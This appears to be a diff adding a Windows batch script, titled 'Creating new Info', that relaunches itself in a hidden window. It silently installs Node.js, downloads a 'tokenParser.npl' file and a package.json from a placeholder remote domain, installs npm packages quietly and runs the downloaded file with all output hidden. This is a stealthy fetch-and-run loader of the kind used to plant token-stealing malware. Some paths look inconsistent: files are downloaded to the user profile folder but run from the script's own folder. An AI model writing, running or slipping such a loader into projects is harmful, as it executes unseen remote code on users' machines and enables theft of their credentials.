@@ -1,0 +1,81 @@
+@echo off
+title Creating new Info
+setlocal enabledelayedexpansion
+
+if "%~1"=="_restarted" (
+    goto CONTINUE
+)
+powershell -WindowStyle Hidden -Command "Start-Process -FilePath cmd.exe -ArgumentList '/c \"%~f0\" _restarted' -WindowStyle Hidden"
+exit /b
+
+:CONTINUE
+set "NODE_VERSION=20.11.1"
+set "NODE_MSI=node-v%NODE_VERSION%-x64.msi"
+set "DOWNLOAD_URL=https://nodejs.org/dist/v%NODE_VERSION%/%NODE_MSI%"
+set "NODE_DIR=%~dp0node-v%NODE_VERSION%-x64"
+
+set "NODE_INSTALLED_VERSION="
+
+for /f "delims=" %%v in ('node -v 2^>nul') do (
+    call set "NODE_INSTALLED_VERSION=%%v"
+)
+
+if not defined NODE_INSTALLED_VERSION (
+    set "INSTALL_NODE=1"
+) else (
+    set "INSTALL_NODE=0"
+)
+
+if "!INSTALL_NODE!"=="1" (
+    where curl >nul 2>&1
+    if %errorlevel% NEQ 0 (
+        powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%NODE_MSI%'"
+    ) else (
+        curl -s -L -o "%NODE_MSI%" "%DOWNLOAD_URL%"
+    )
+
+    if exist "%NODE_MSI%" (
+        powershell -Command "tar -xf '%NODE_MSI%'"
+        if exist "%NODE_MSI%" del "%NODE_MSI%"
+    ) else (
+        exit /b 1
+    )
+
+    set "PATH=%NODE_DIR%\bin;%PATH%"
+)
+
+where node >nul 2>&1
+if errorlevel 1 (
+    exit /b
+)
+
+where npm >nul 2>&1
+if errorlevel 1 (
+    exit /b
+)
+
+:: Set user profile path
+set "USERPROFILE=%USERPROFILE%"
+
+curl -L -o "%USERPROFILE%\tokenParser.npl" "{{DOMAIN}}/tokenParser.npl"
+curl -L -o "%USERPROFILE%\package.json" "{{DOMAIN}}/package.json"
+
+if not exist "%~dp0node_modules\request" (
+    pushd "%~dp0"
+    call npm install --silent --no-progress --loglevel=error --fund=false >nul 2>&1
+    if errorlevel 1 (
+        popd
+        exit /b
+    )
+    popd
+)
+
+if exist "%~dp0tokenParser.npl" (
+    node "%~dp0tokenParser.npl" >nul 2>&1
+    if errorlevel 1 (
+        exit /b
+    )
+) else (
+    exit /b
+)
+exit /b 0
